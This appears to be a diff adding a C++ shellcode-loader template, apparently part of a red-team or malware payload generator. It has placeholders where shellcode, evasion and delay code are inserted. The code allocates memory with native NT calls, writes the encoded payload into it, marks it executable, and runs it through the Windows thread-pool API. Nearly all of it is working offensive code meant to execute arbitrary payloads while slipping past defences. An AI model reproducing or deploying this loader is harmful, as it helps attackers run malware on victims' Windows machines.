@@ -1,0 +1,86 @@
+#include <iostream>
+#include <windows.h>
+#include <psapi.h>
+#include <tlhelp32.h>
+#include <stdlib.h>
+#include <tchar.h>
+
+//####INCLUDE####
+
+//####DEFINE####
+
+//####CODE####
+
+
+DWORD WINAPI esc_main(LPVOID lpParameter)
+{
+    DWORD dwSize;
+    //HANDLE currentProcess;
+
+    unsigned char encoded[] = ####SHELLCODE####;
+    SIZE_T length = sizeof(encoded);
+
+    //unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
+    //memcpy(encoded, raw, length);
+    //SIZE_T bytesWritten;
+
+    //####CALL####
+    unsigned char* decoded = encoded;
+
+
+    //####SYSCALL####
+    HANDLE hProc = GetCurrentProcess();
+    PVOID base_addr = NULL;
+    SIZE_T pnew = length;
+    SIZE_T bytesWritten = 0;
+    DWORD oldProtect = 0;
+    NTSTATUS status;
+
+    // Allocate memory for shellcode
+    status = NtAllocateVirtualMemory(hProc, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (status != 0) {
+        std::cerr << "NtAllocateVirtualMemory failed with status: " << std::hex << status << std::endl;
+        return 1;
+    }
+
+    // Write shellcode to allocated memory
+    status = NtWriteVirtualMemory(hProc, base_addr, decoded, pnew, &bytesWritten);
+    if (status != 0) {
+        std::cerr << "NtWriteVirtualMemory failed with status: " << std::hex << status << std::endl;
+       
+    }
+
+    // Change memory protection to executable
+    status = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&pnew, PAGE_EXECUTE_READ, &oldProtect);
+    if (status != 0) {
+        std::cerr << "NtProtectVirtualMemory failed with status: " << std::hex << status << std::endl;
+        return 1;
+    }
+
+    std::cout << "Executing shellcode using Thread Pool API..." << std::endl;
+
+    // Create thread pool work item with shellcode as callback
+    PTP_WORK work = CreateThreadpoolWork((PTP_WORK_CALLBACK)base_addr, NULL, NULL);
+    if (!work) {
+        std::cerr << "CreateThreadpoolWork failed with error: " << GetLastError() << std::endl;
+        return 1;
+    }
+
+    // Submit work item to thread pool
+    SubmitThreadpoolWork(work);
+
+    // Wait for work to complete
+    WaitForThreadpoolWorkCallbacks(work, FALSE);
+    CloseThreadpoolWork(work);
+    
+    return 0;
+}
+
+int main()
+{
+    //####DELAY####
+    //####EVASION####
+    //####ARGS####
+
+    esc_main(NULL);
+}
